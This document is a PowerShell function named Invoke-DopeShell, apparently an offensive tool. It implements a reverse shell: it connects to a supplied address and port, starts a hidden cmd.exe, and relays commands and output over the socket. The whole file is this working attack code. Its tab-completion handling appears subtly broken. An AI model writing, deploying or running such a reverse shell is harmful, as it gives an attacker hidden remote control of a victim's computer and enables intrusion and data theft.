function Invoke-DopeShell {
    param (
        [string]$address,
        [int]$port
    )

    function cleanup {
        if ($client.Connected -eq $true) {$client.Close()}
        if ($process -and $process.HasExited -eq $false) {$process.Close()}
        exit
    }

    $client = New-Object system.net.sockets.tcpclient
    $client.connect($address,$port)
    $stream = $client.GetStream()
    $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
    $process = New-Object System.Diagnostics.Process

    # Setup the process start info
    $process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.RedirectStandardError = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true  # This will prevent the command prompt window from appearing

    $process.Start()
    $inputstream = $process.StandardInput
    $outputstream = $process.StandardOutput
    $errorstream = $process.StandardError

    Start-Sleep 1
    $encoding = New-Object System.Text.AsciiEncoding

    # Initial output
    if ($outputstream.Peek() -ne -1) {
        $out = $outputstream.ReadToEnd()
        $stream.Write($encoding.GetBytes($out), 0, $out.Length)
    }

    while ($true) {
        if ($client.Connected -ne $true) {cleanup}
        $pos = 0

        while ($stream.DataAvailable) {
            $read = $stream.Read($networkbuffer, $pos, $networkbuffer.Length - $pos)
            $pos += $read
        }

        if ($pos -gt 0) {
            $string = $encoding.GetString($networkbuffer, 0, $pos)
            
            # Handle tab completion
            if ($string -eq "`t") {  # Backtick t represents a tab character in PowerShell
                $currentCommand = $inputstream.ReadLine()
                $completionResults = [System.Management.Automation.CommandCompletion]::CompleteInput($currentCommand, $currentCommand.Length, $true).CompletionMatches
                $completionText = $completionResults | ForEach-Object { $_.CompletionText } -join "`n"
                $stream.Write($encoding.GetBytes($completionText), 0, $completionText.Length)
            } else {
                $inputstream.Write($string)
                $inputstream.Flush()

                Start-Sleep 1

                if ($process.HasExited) {cleanup}
                else {
                    $out = ""
                    if ($outputstream.Peek() -ne -1) {
                        $out += $outputstream.ReadToEnd()
                    }
                    if ($errorstream.Peek() -ne -1) {
                        $out += $errorstream.ReadToEnd()
                    }

                    if ($out -ne "") {
                        $stream.Write($encoding.GetBytes($out), 0, $out.Length)
                    }
                }
            }
        } else {
            Start-Sleep 1
        }
    }
}
